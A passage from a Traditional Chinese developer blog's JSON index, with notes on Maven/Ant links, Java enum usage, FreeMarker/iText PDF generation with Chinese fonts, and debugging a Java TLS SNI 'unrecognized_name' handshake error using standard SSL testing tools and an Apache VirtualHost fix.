href=\"https://blog.csdn.net/keshacookie/article/details/50506428\" target=\"_blank\" rel=\"noopener\">Maven查找依赖树，解决jar包冲突问题_Java_Epic丶玖遇-CSDN博客</a><br><a href=\"https://juejin.im/post/5ce90722f265da1bd522aa70\" target=\"_blank\" rel=\"noopener\">Jar 包依赖冲突排查思路和解决方法（logback + slf4j-log4j12） - 掘金</a><br><a href=\"https://www.jianshu.com/p/100439269148\" target=\"_blank\" rel=\"noopener\">重新看待Jar包冲突问题及解决方案 - 簡書</a></p>\n<h2 id=\"ANT\"><a href=\"#ANT\" class=\"headerlink\" title=\"ANT\"></a>ANT</h2><p><a href=\"https://dotblogs.com.tw/grayyin/2016/07/26/203656\" target=\"_blank\" rel=\"noopener\">[JAVA] 用Ant打包war的簡單流程 | 阿輝的零碎筆記 - 點部落</a></p>\n","categories":["Java"],"tags":["java","jboss","tomcat"]},{"title":"Java 使用 Enum 小記","url":"/blog/2020/05/28/Java-%E4%BD%BF%E7%94%A8-Enum-%E5%B0%8F%E8%A8%98/","content":"<p>平常不怎麼使用 Enum<br>非常地不熟悉<br>今天剛好用到<br>順便季錄一下</p>\n<a id=\"more\"></a>\n<h2 id=\"簡單使用\"><a href=\"#簡單使用\" class=\"headerlink\" title=\"簡單使用\"></a>簡單使用</h2><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">enum</span> Action &#123;</span><br><span class=\"line\">    STOP, RIGHT, LEFT, UP, DOWN</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>這邊簡單可以看到<br><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">play</span><span class=\"params\">(<span class=\"keyword\">int</span> action)</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">switch</span>(action) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">case</span> Action.STOP:</span><br><span class=\"line\">            System.out.println(<span class=\"string\">\"播放停止動畫\"</span>);</span><br><span class=\"line\">            <span class=\"keyword\">break</span>;</span><br><span class=\"line\">        略...</span><br><span class=\"line\">        <span class=\"keyword\">default</span>:</span><br><span class=\"line\">            System.out.println(<span class=\"string\">\"不支援此動作\"</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>以前<del>抄抄範例</del>，這邊會發現<code>int action</code><br>怎麼會跑出 <code>int</code> 出來？</p>\n<p>其實 Enum 反編譯出來，會跟原本 Enum 出來不一樣<br>不知道這算不算是 Java 語法糖?</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">略...</span><br><span class=\"line\"><span class=\"keyword\">static</span> &#123;</span><br><span class=\"line\">    STOP = <span class=\"keyword\">new</span> Action(<span class=\"string\">\"STOP\"</span>, <span class=\"number\">0</span>);</span><br><span class=\"line\">    RIGHT = <span class=\"keyword\">new</span> Action(<span class=\"string\">\"RIGHT\"</span>, <span class=\"number\">1</span>);</span><br><span class=\"line\">    LEFT = <span class=\"keyword\">new</span> Action(<span class=\"string\">\"LEFT\"</span>, <span class=\"number\">2</span>);</span><br><span class=\"line\">    UP = <span class=\"keyword\">new</span> Action(<span class=\"string\">\"UP\"</span>, <span class=\"number\">3</span>);</span><br><span class=\"line\">    DOWN = <span class=\"keyword\">new</span> Action(<span class=\"string\">\"DOWN\"</span>, <span class=\"number\">4</span>);</span><br><span class=\"line\">    略...</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>詳細內容可以看:<a href=\"https://openhome.cc/Gossip/Java/Enum.html\" target=\"_blank\" rel=\"noopener\">使用 enum 列舉常數</a></p>\n<h2 id=\"自定一些內容\"><a href=\"#自定一些內容\" class=\"headerlink\" title=\"自定一些內容\"></a>自定一些內容</h2><p>我們公司使用不單是這樣<br>可以設定出</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">enum</span> Car &#123;</span><br><span class=\"line\">    MAX_CAR(<span class=\"number\">100</span>,<span class=\"string\">\"最高級車\"</span>), NORM_CAR(<span class=\"number\">5</span>,<span class=\"string\">\"中級車\"</span>), MIN_CAR(<span class=\"number\">1</span>,<span class=\"string\">\"低級車\"</span>); </span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">int</span> price;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> String desc;</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">private</span> <span class=\"title\">Car</span><span class=\"params\">(<span class=\"keyword\">int</span> price, String desc)</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">this</span>.price = price;</span><br><span class=\"line\">        <span class=\"keyword\">this</span>.desc = desc;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">int</span> <span class=\"title\">price</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> price;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> String <span class=\"title\">desc</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> desc;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(String[] args)</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">for</span>(Car car : Car.values()) &#123;</span><br><span class=\"line\">            System.out.printf(<span class=\"string\">\"Car(%s, %d, %s)%n\"</span>,</span><br><span class=\"line\">                  car , car.price() , car.desc());</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>這邊看到會對印到 <code>MAX_CAR(100,&quot;最高級車&quot;), NORM_CAR(5,&quot;中級車&quot;), MIN_CAR(1,&quot;低級車&quot;);</code></p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">private</span> <span class=\"title\">Car</span><span class=\"params\">(<span class=\"keyword\">int</span> price, String desc)</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">this</span>.price = price;</span><br><span class=\"line\">    <span class=\"keyword\">this</span>.desc = desc;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>其他詳細可看:<a href=\"https://openhome.cc/Gossip/Java/EnumMore.html\" target=\"_blank\" rel=\"noopener\">進階 enum 運用</a></p>\n<h2 id=\"取出列表資料\"><a href=\"#取出列表資料\" class=\"headerlink\" title=\"取出列表資料\"></a>取出列表資料</h2><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">for</span>(Car car: Car.values())</span><br><span class=\"line\">    System.out.println(car.name());</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p><code>.values()</code> 可以印出列表出來</p>\n<p>那有沒有find 呢?<br>目前看應該只能用迴圈滾…</p>\n<p>轉成陣列方法</p>\n<blockquote>\n<p>You can do (pre-Java 8):<br><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">&gt; List&lt;Enum&gt; enumValues = Arrays.asList(Enum.values());</span><br><span class=\"line\">&gt;</span><br></pre></td></tr></table></figure></p>\n</blockquote>\n<blockquote>\n<p>or<br><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">&gt; List&lt;Enum&gt; enumValues = <span class=\"keyword\">new</span> ArrayList&lt;Enum&gt;(EnumSet.allOf(Enum.class));</span><br><span class=\"line\">&gt;</span><br></pre></td></tr></table></figure></p>\n</blockquote>\n<blockquote>\n<p>Using Java 8 features, you can map each constant to its name:<br><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">&gt; List&lt;String&gt; enumNames = Stream.of(Enum.values())</span><br><span class=\"line\">&gt;                                .map(Enum::name)</span><br><span class=\"line\">&gt;                                .collect(Collectors.toList());</span><br><span class=\"line\">&gt;</span><br></pre></td></tr></table></figure></p>\n</blockquote>\n<p><a href=\"https://stackoverflow.com/questions/4936819/java-check-if-enum-contains-a-given-string/4936895\" target=\"_blank\" rel=\"noopener\">Java: Check if enum contains a given string? - Stack Overflow</a></p>\n<blockquote>\n<p>This should do it:<br><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">&gt; <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">boolean</span> <span class=\"title\">contains</span><span class=\"params\">(String test)</span> </span>&#123;</span><br><span class=\"line\">&gt; </span><br><span class=\"line\">&gt;     <span class=\"keyword\">for</span> (Choice c : Choice.values()) &#123;</span><br><span class=\"line\">&gt;         <span class=\"keyword\">if</span> (c.name().equals(test)) &#123;</span><br><span class=\"line\">&gt;             <span class=\"keyword\">return</span> <span class=\"keyword\">true</span>;</span><br><span class=\"line\">&gt;         &#125;</span><br><span class=\"line\">&gt;     &#125;</span><br><span class=\"line\">&gt; </span><br><span class=\"line\">&gt;     <span class=\"keyword\">return</span> <span class=\"keyword\">false</span>;</span><br><span class=\"line\">&gt; &#125;</span><br><span class=\"line\">&gt;</span><br></pre></td></tr></table></figure></p>\n</blockquote>\n<blockquote>\n<p>This way means you do not have to worry about adding additional enum values later, they are &gt; all checked.</p>\n<p>Edit: If the enum is very large you could stick the values in a HashSet:<br><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">&gt; <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> HashSet&lt;String&gt; <span class=\"title\">getEnums</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">&gt; </span><br><span class=\"line\">&gt;   HashSet&lt;String&gt; values = <span class=\"keyword\">new</span> HashSet&lt;String&gt;();</span><br><span class=\"line\">&gt; </span><br><span class=\"line\">&gt;   <span class=\"keyword\">for</span> (Choice c : Choice.values()) &#123;</span><br><span class=\"line\">&gt;       values.add(c.name());</span><br><span class=\"line\">&gt;   &#125;</span><br><span class=\"line\">&gt; </span><br><span class=\"line\">&gt;   <span class=\"keyword\">return</span> values;</span><br><span class=\"line\">&gt; &#125;</span><br><span class=\"line\">&gt;</span><br></pre></td></tr></table></figure></p>\n</blockquote>\n<blockquote>\n<p>Then you can just do: values.contains(“your string”) which returns true or false.</p>\n</blockquote>\n<p>其他之後有遇到再補</p>\n<p><strong>2020-06-18</strong></p>\n<p>最近做 Enum 發現測試環境跟正式環境設定的值會不一樣<br>所以找一下有什麼方法可以解決這個問題</p>\n<p><a href=\"https://stackoverflow.com/questions/4908973/java-property-file-as-enum\" target=\"_blank\" rel=\"noopener\">java property file as enum - Stack Overflow</a></p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">enum</span> Constants &#123;</span><br><span class=\"line\">    PROP1,</span><br><span class=\"line\">    PROP2;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">static</span> <span class=\"keyword\">final</span> String PATH            = <span class=\"string\">\"/constants.properties\"</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">static</span> <span class=\"keyword\">final</span> Logger logger          = LoggerFactory.getLogger(Constants.class);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">static</span> Properties   properties;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">private</span> String          value;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">private</span> <span class=\"keyword\">void</span> <span class=\"title\">init</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (properties == <span class=\"keyword\">null</span>) &#123;</span><br><span class=\"line\">            properties = <span class=\"keyword\">new</span> Properties();</span><br><span class=\"line\">            <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">                properties.load(Constants.class.getResourceAsStream(PATH));</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            <span class=\"keyword\">catch</span> (Exception e) &#123;</span><br><span class=\"line\">                logger.error(<span class=\"string\">\"Unable to load \"</span> + PATH + <span class=\"string\">\" file from classpath.\"</span>, e);</span><br><span class=\"line\">                System.exit(<span class=\"number\">1</span>);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        value = (String) properties.get(<span class=\"keyword\">this</span>.toString());</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> String <span class=\"title\">getValue</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (value == <span class=\"keyword\">null</span>) &#123;</span><br><span class=\"line\">            init();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> value;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n","categories":["Java"],"tags":["java"]},{"title":"Java 使用 freemarker (ftl) XHTML 轉 PDF","url":"/blog/2021/02/23/Java-%E4%BD%BF%E7%94%A8-freemarker-ftl-XHTML-%E8%BD%89-PDF/","content":"<p>TODO: 整理</p>\n<a id=\"more\"></a>\n<ul>\n<li><a href=\"https://github.com/haopenge/freemark-html-xhtml-pdf\" target=\"_blank\" rel=\"noopener\">haopenge/freemark-html-xhtml-pdf: freemark-html-xhtml-pdf ，从名称可以看出此项目是三者之间的转换，用于生成pdf 文件的</a></li>\n<li><a href=\"https://www.itread01.com/content/1544193481.html\" target=\"_blank\" rel=\"noopener\">freemarker生成html、html轉pdf、pdf根據關鍵字定位、pdf簽名 - IT閱讀</a></li>\n<li><a href=\"https://www.cnblogs.com/linyufeng/p/13402901.html\" target=\"_blank\" rel=\"noopener\">java通过html生成pdf,支持css和图片以及横向打印 - 林宇风 - 博客园</a></li>\n<li><a href=\"https://www.cnblogs.com/linyufeng/p/13402901.html\" target=\"_blank\" rel=\"noopener\">java通过html生成pdf,支持css和图片以及横向打印 - 林宇风 - 博客园</a></li>\n<li><a href=\"https://blog.csdn.net/hunan961/article/details/104901519\" target=\"_blank\" rel=\"noopener\">xhtmlrenderer + iText-HTML转PDF_hunan961的博客-CSDN博客_xhtmlrenderer</a></li>\n<li><a href=\"https://my.oschina.net/yifanxiang/blog/680936\" target=\"_blank\" rel=\"noopener\">itext将html转为pdf,图片标签为base64的处理 - 小翔的个人空间 - OSCHINA - 中文开源技术交流社区</a></li>\n<li><a href=\"https://my.oschina.net/yifanxiang/blog/680936\" target=\"_blank\" rel=\"noopener\">itext将html转为pdf,图片标签为base64的处理 - 小翔的个人空间 - OSCHINA - 中文开源技术交流社区</a></li>\n</ul>\n<h2 id=\"中文看不見問題-字型\"><a href=\"#中文看不見問題-字型\" class=\"headerlink\" title=\"中文看不見問題(字型)\"></a>中文看不見問題(字型)</h2><ul>\n<li><a href=\"https://blog.csdn.net/HaHa_Sir/article/details/84350671\" target=\"_blank\" rel=\"noopener\">解决PDF添加水印报错iText： Font ‘STSong-Light’ with ‘UniGB-UCS2-H’ is not recognized_HaHa_Sir的博客-CSDN博客</a></li>\n<li><a href=\"https://www.javaworld.com.tw/jute/post/view?bid=11&amp;id=266144&amp;tpg=1&amp;ppg=1&amp;sty=1&amp;age=0#266144\" target=\"_blank\" rel=\"noopener\">JWorld@TW Java論壇 - iText RtfShape 內文為中文會出現亂碼</a></li>\n<li><a href=\"http://wiki.psmonkey.org/java-3rd-lib/itext\" target=\"_blank\" rel=\"noopener\">iText - PsMonkey 隨手筆記</a></li>\n<li><a href=\"https://www.cnblogs.com/yunfeiyang-88/p/10984740.html\" target=\"_blank\" rel=\"noopener\">Java iText+FreeMarker生成PDF(HTML转PDF) - 云飞扬-88 - 博客园</a></li>\n<li><a href=\"https://codertw.com/%E7%A8%8B%E5%BC%8F%E8%AA%9E%E8%A8%80/547725/\" target=\"_blank\" rel=\"noopener\">iText 解決中文問字型問題 顯示中文 | 程式前沿</a></li>\n</ul>\n<p>簡單說明一下，我這邊使用方法不是載入程式內部字型<br>是使用 jar 裡面自型解決<a href=\"https://blog.csdn.net/HaHa_Sir/article/details/84350671\" target=\"_blank\" rel=\"noopener\">解决PDF添加水印报错iText： Font ‘STSong-Light’ with ‘UniGB-UCS2-H’ is not recognized_HaHa_Sir的博客-CSDN博客</a></p>\n<blockquote>\n<p>1、itext 經歷了從： itext.itext —&gt; com.lowagie —&gt; com.itextpdf 的三次升級，若使用了舊版本的jar，就會出現錯誤，還不好發現。<br>2、多從maven repository 搜索下相關jar包，關注組件的歷史變化情況。<br>3、會debeug，會追蹤源碼，找到拋出異常的根本原因所在！<br>這邊找相對應java 版本，所以把itext-asian升到 5.2 就可以跑了<br>後來對應網路上字型都不能跑(會亂碼)，<br>猜測是簡體字型關係，看到<a href=\"https://www.javaworld.com.tw/jute/post/view?bid=11&amp;id=266144&amp;tpg=1&amp;ppg=1&amp;sty=1&amp;age=0#266144\" target=\"_blank\" rel=\"noopener\">JWorld@TW Java論壇 - iText RtfShape 內文為中文會出現亂碼</a></p>\n</blockquote>\n<pre><code class=\"java\">bfChinese = BaseFont.createFont(<span class=\"string\">\"MHei-Medium\"</span>, <span class=\"string\">\"UniCNS-UCS2-H\"</span>, BaseFont.NOT_EMBEDDED);\n</code></pre>\n<p>就可以跑出中文字，感動QQ</p>\n<p>後來發現用 Android 中文會看不到<br>可能用標楷體會能解決</p>\n<h2 id=\"圖片-base64\"><a href=\"#圖片-base64\" class=\"headerlink\" title=\"圖片(base64)\"></a>圖片(base64)</h2><h2 id=\"轉-xhtml\"><a href=\"#轉-xhtml\" class=\"headerlink\" title=\"轉 xhtml\"></a>轉 xhtml</h2><h2 id=\"別人範例\"><a href=\"#別人範例\" class=\"headerlink\" title=\"別人範例\"></a>別人範例</h2><p><a href=\"https://www.cnblogs.com/blueskyli/p/9921832.html\" target=\"_blank\" rel=\"noopener\">一次java导出pdf的经历 - mickey007 - 博客园</a><br><a href=\"https://www.jianshu.com/p/36517afe0c36\" target=\"_blank\" rel=\"noopener\">Java生成pdf文件或jpg图片 - 简书</a></p>\n<h2 id=\"別的方法\"><a href=\"#別的方法\" class=\"headerlink\" title=\"別的方法\"></a>別的方法</h2><p><a href=\"https://github.com/jhonnymertz/java-wkhtmltopdf-wrapper\" target=\"_blank\" rel=\"noopener\">jhonnymertz/java-wkhtmltopdf-wrapper: A Java wrapper for wkhtmltopdf</a></p>\n","categories":["Java"],"tags":["java","freemarker","ftl"]},{"title":"Java 因憑證 SNI 問題驗證不過","url":"/blog/2020/06/25/Java-%E5%9B%A0%E6%86%91%E8%AD%89-SNI-%E5%95%8F%E9%A1%8C%E9%A9%97%E8%AD%89%E4%B8%8D%E9%81%8E/","content":"<p>最近在做 line webhook<br>但是做測試的時候<br>發現沒有呼叫我的程式<br>但我手機、其他電腦都可以連線<br>這又非常詭異</p>\n<a id=\"more\"></a>\n<h2 id=\"使用外部網站檢查\"><a href=\"#使用外部網站檢查\" class=\"headerlink\" title=\"使用外部網站檢查\"></a>使用外部網站檢查</h2><p>我在<a href=\"https://www.ssllabs.com/ssltest/\" target=\"_blank\" rel=\"noopener\">SSL Server Test (Powered by Qualys SSL Labs)</a>做測試<br>是在這裡面找到的<a href=\"https://github.com/edelahozuah/awesome-tls-security\" target=\"_blank\" rel=\"noopener\">edelahozuah/awesome-tls-security: A collection of (not-so, yet) awesome resources related to TLS, PKI and related stuff</a></p>\n<p>這個網站可以找到很多問題<br>但主要不能連我是遇到的問題是<code>Client aborts on SNI unrecognized_name warning</code></p>\n<img src=\"/blog/2020/06/25/Java-因憑證-SNI-問題驗證不過/error1.png\" title=\"Java SNI 憑證問題\">\n<h2 id=\"使用-Java-SSLTEST\"><a href=\"#使用-Java-SSLTEST\" class=\"headerlink\" title=\"使用 Java SSLTEST\"></a>使用 Java SSLTEST</h2><p>不多說，紀錄安裝過程</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 安裝 jdk</span></span><br><span class=\"line\">sudo apt install default-jdk <span class=\"comment\">#openjdk-11-jdk</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 下載 ssltest</span></span><br><span class=\"line\">git <span class=\"built_in\">clone</span> https://github.com/ChristopherSchultz/ssltest.git</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">cd</span> ssltest</span><br><span class=\"line\">./build.sh <span class=\"comment\"># 記得 socure 跟 target 要改11 因為我使用的是11</span></span><br><span class=\"line\"><span class=\"built_in\">cd</span> build</span><br><span class=\"line\">java -jar ssltest.jar google.com</span><br><span class=\"line\"><span class=\"comment\"># 我第一次的實用適用 jdk 7 跑，會有 sni Exception</span></span><br><span class=\"line\"><span class=\"comment\"># 但我現在用 jdk 11 沒有跑出 Exception</span></span><br><span class=\"line\"><span class=\"comment\"># 不過可以看到沒有 Accepted</span></span><br><span class=\"line\">java -jar ssltest.jar  google.com.tw | grep Accepted</span><br></pre></td></tr></table></figure>\n<p>自己來寫一隻來驗證<br>其實用 postman 產生範例<br>搭配我之前 maven 執行<br><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">OkHttpClient client = <span class=\"keyword\">new</span> OkHttpClient();</span><br><span class=\"line\"></span><br><span class=\"line\">Request request = <span class=\"keyword\">new</span> Request.Builder()</span><br><span class=\"line\">  .url(<span class=\"string\">\"http://httpbin.org/get?test=123%20123\"</span>)</span><br><span class=\"line\">  .get()</span><br><span class=\"line\">  .addHeader(<span class=\"string\">\"cache-control\"</span>, <span class=\"string\">\"no-cache\"</span>)</span><br><span class=\"line\">  .addHeader(<span class=\"string\">\"postman-token\"</span>, <span class=\"string\">\"b0cbc43f-9a70-1056-951e-e5b0c6b2dd33\"</span>)</span><br><span class=\"line\">  .build();</span><br><span class=\"line\"></span><br><span class=\"line\">Response response = client.newCall(request).execute();</span><br></pre></td></tr></table></figure></p>\n<p>maven 不知道為什麼執行要加這段<code>-Dexec.cleanupDaemonThreads=false</code><br><a href=\"https://www.shangmayuan.com/a/405034f1ec9c45fe8e1aa411.html\" target=\"_blank\" rel=\"noopener\">运行 mvn java:exec 如何避免 <code>IllegalThreadStateException</code> - 尚码园</a></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">[WARNING] </span><br><span class=\"line\">javax.net.ssl.SSLHandshakeException: received handshake warning: unrecognized_name</span><br><span class=\"line\">    at sun.security.ssl.Alert.createSSLException (Alert.java:131)</span><br><span class=\"line\">    at sun.security.ssl.Alert.createSSLException (Alert.java:117)</span><br><span class=\"line\">    at sun.security.ssl.TransportContext.fatal (TransportContext.java:313)</span><br><span class=\"line\">    at sun.security.ssl.TransportContext.fatal (TransportContext.java:269)</span><br><span class=\"line\">    at sun.security.ssl.TransportContext.fatal (TransportContext.java:260)</span><br><span class=\"line\">    at sun.security.ssl.Alert$AlertConsumer.consume (Alert.java:272)</span><br><span class=\"line\">    at sun.security.ssl.TransportContext.dispatch (TransportContext.java:186)</span><br><span class=\"line\">    at sun.security.ssl.SSLTransport.decode (SSLTransport.java:164)</span><br><span class=\"line\">    at sun.security.ssl.SSLSocketImpl.decode (SSLSocketImpl.java:1144)</span><br><span class=\"line\">    at sun.security.ssl.SSLSocketImpl.readHandshakeRecord (SSLSocketImpl.java:1055)</span><br><span class=\"line\">    at sun.security.ssl.SSLSocketImpl.startHandshake (SSLSocketImpl.java:395)</span><br><span class=\"line\">    at okhttp3.internal.connection.RealConnection.connectTls (RealConnection.kt:367)</span><br><span class=\"line\">    at okhttp3.internal.connection.RealConnection.establishProtocol (RealConnection.kt:325)</span><br><span class=\"line\">    at okhttp3.internal.connection.RealConnection.connect (RealConnection.kt:197)</span><br><span class=\"line\">    at okhttp3.internal.connection.ExchangeFinder.findConnection (ExchangeFinder.kt:249)</span><br><span class=\"line\">    at okhttp3.internal.connection.ExchangeFinder.findHealthyConnection (ExchangeFinder.kt:108)</span><br><span class=\"line\">    at okhttp3.internal.connection.ExchangeFinder.find (ExchangeFinder.kt:76)</span><br><span class=\"line\">    at okhttp3.internal.connection.RealCall.initExchange$okhttp (RealCall.kt:245)</span><br><span class=\"line\">    at okhttp3.internal.connection.ConnectInterceptor.intercept (ConnectInterceptor.kt:32)</span><br><span class=\"line\">    at okhttp3.internal.http.RealInterceptorChain.proceed (RealInterceptorChain.kt:100)</span><br><span class=\"line\">    at okhttp3.internal.cache.CacheInterceptor.intercept (CacheInterceptor.kt:96)</span><br><span class=\"line\">    at okhttp3.internal.http.RealInterceptorChain.proceed (RealInterceptorChain.kt:100)</span><br><span class=\"line\">    at okhttp3.internal.http.BridgeInterceptor.intercept (BridgeInterceptor.kt:83)</span><br><span class=\"line\">    at okhttp3.internal.http.RealInterceptorChain.proceed (RealInterceptorChain.kt:100)</span><br><span class=\"line\">    at okhttp3.internal.http.RetryAndFollowUpInterceptor.intercept (RetryAndFollowUpInterceptor.kt:76)</span><br><span class=\"line\">    at okhttp3.internal.http.RealInterceptorChain.proceed (RealInterceptorChain.kt:100)</span><br><span class=\"line\">    at okhttp3.internal.connection.RealCall.getResponseWithInterceptorChain$okhttp (RealCall.kt:197)</span><br><span class=\"line\">    at okhttp3.internal.connection.RealCall.execute (RealCall.kt:148)</span><br><span class=\"line\">    at test.App.main (App.java:23)</span><br><span class=\"line\">    at org.codehaus.mojo.exec.ExecJavaMojo$1.run (ExecJavaMojo.java:254)</span><br><span class=\"line\">    at java.lang.Thread.run (Thread.java:834)</span><br></pre></td></tr></table></figure>\n<p>正在就能證明 JAVA 程式會有問題</p>\n<h2 id=\"Java-其他驗證\"><a href=\"#Java-其他驗證\" class=\"headerlink\" title=\"Java 其他驗證\"></a>Java 其他驗證</h2><p>這個也可以直接看到 Exception 錯誤內容</p>\n<p><a href=\"https://github.com/UniconLabs/java-keystore-ssl-test\" target=\"_blank\" rel=\"noopener\">UniconLabs/java-keystore-ssl-test: A simple script to verify SSL/HTTPS functionality of a remote host through JDK keystore.</a></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">mvn clean package</span><br><span class=\"line\"><span class=\"built_in\">cd</span> target</span><br><span class=\"line\">java -jar java-keystore-test-0.1.0.jar https://google.com.tw</span><br></pre></td></tr></table></figure>\n<h2 id=\"其他程式\"><a href=\"#其他程式\" class=\"headerlink\" title=\"其他程式\"></a>其他程式</h2><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">curl https://xxx</span><br></pre></td></tr></table></figure>\n<p>golang 就用 postman 產生出來吧</p>\n<h2 id=\"解決方法\"><a href=\"#解決方法\" class=\"headerlink\" title=\"解決方法\"></a>解決方法</h2><p>apache  VirtualServer 設定</p>\n<p>ServerName xxx</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">VirtualHost</span> <span class=\"attr\">xxx:443</span>&gt;</span></span><br><span class=\"line\">ServerName www.example.com</span><br><span class=\"line\">ServerAlias example.com www.example.com</span><br><span class=\"line\">...</span><br></pre></td></tr></table></figure>\n<p><a href=\"https://qualys-secure.force.com/discussions/s/question/0D52L00004TnvXySAJ/client-aborts-on-sni-unrecognizedname-warning\" target=\"_blank\" rel=\"noopener\">Client aborts on SNI unrecognized_name warning</a><br><a href=\"https://jervis.ws/qualys-labs-ssl-test-incorrect-sni-alerts/\" target=\"_blank\" rel=\"noopener\">Qualys Labs SSL Test - Incorrect SNI alerts - JERVIS DOT WS</a></p>\n<p>其他相關<br><a href=\"https://stackoverflow.com/questions/37206209/handshake-alert-unrecognized-name-liberty-profile\" target=\"_blank\" rel=\"noopener\">java - Handshake alert: Unrecognized_name Liberty Profile - Stack Overflow</a><br><a href=\"https://geekflare.com/ssl-test-certificate/\" target=\"_blank\" rel=\"noopener\">10 Online Tool to Test SSL, TLS and Latest Vulnerability - Geekflare</a></p>\n<p><a href=\"https://github.com/drwetter/testssl.sh\" target=\"_blank\" rel=\"noopener\">drwetter/testssl.sh: Testing TLS/SSL encryption anywhere on any port</a><br>git clone <a href=\"https://github.com/drwetter/testssl.sh\" target=\"_blank\" rel=\"noopener\">https://github.com/drwetter/testssl.sh</a><br>chmod a+x testssh.sh<br>./testssh.sh google.com</p>\n<p><a href=\"https://github.com/pornin/TestSSLServer\" target=\"_blank\" rel=\"noopener\">pornin/TestSSLServer</a><br><a href=\"https://www.bear2little.net/wordpress/?paged=4\" target=\"_blank\" rel=\"noopener\">tord and lion’s lair | 各式心得 | 頁 4</a></p>\n<h2 id=\"感想\"><a href=\"#感想\" class=\"headerlink\" title=\"感想\"></a>感想</h2><p>之前<a href=\"https://malagege.github.io/blog/2018/10/10/%E8%90%AC%E7%94%A8%E6%86%91%E8%AD%89-WildCard-%E5%92%8C%E4%B8%AD%E9%96%93%E6%86%91%E8%AD%89%E5%B0%8F%E8%A8%98/\">萬用憑證(WildCard)和中間憑證小記 | 程式狂想筆記</a>就讓我以為就不會有其他問題<br>沒想到 Java 也有憑證這一關(好像是 Java 